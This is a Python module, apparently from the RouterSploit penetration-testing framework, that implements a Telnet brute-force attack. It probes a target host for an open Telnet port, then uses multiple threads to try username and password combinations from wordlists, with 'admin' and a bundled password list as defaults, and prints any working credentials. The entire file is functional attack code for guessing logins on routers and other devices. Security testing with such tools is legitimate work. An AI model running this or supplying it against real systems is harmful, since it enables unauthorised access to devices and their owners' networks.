import itertools
from routersploit.core.exploit import *
from routersploit.core.telnet.telnet_client import TelnetClient
from routersploit.resources import wordlists


class Exploit(TelnetClient):
    __info__ = {
        "name": "Telnet Bruteforce",
        "description": "Module performs bruteforce attack against Telnet service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(8, "Number of threads")

    usernames = OptWordlist("admin", "Username or file with usernames (file://)")
    passwords = OptWordlist(wordlists.passwords, "Password or file with passwords (file://)")

    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting bruteforce attack against Telnet service")

        data = LockedIterator(itertools.product(self.usernames, self.passwords))
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next()
                telnet_client = self.telnet_create()
                if telnet_client.login(username, password, retries=3):
                    if self.stop_on_success:
                        running.clear()

                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))
                    telnet_client.close()

            except StopIteration:
                break

    def check(self):
        telnet_client = self.telnet_create()
        if telnet_client.test_connect():
            print_status("Target exposes Telnet service", verbose=self.verbosity)
            return True

        print_status("Target does not expose Telnet service", verbose=self.verbosity)
        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []

            data = LockedIterator(itertools.product(self.usernames, self.passwords))
            self.run_threads(self.threads, self.target_function, data)

            if self.credentials:
                return self.credentials

        return None
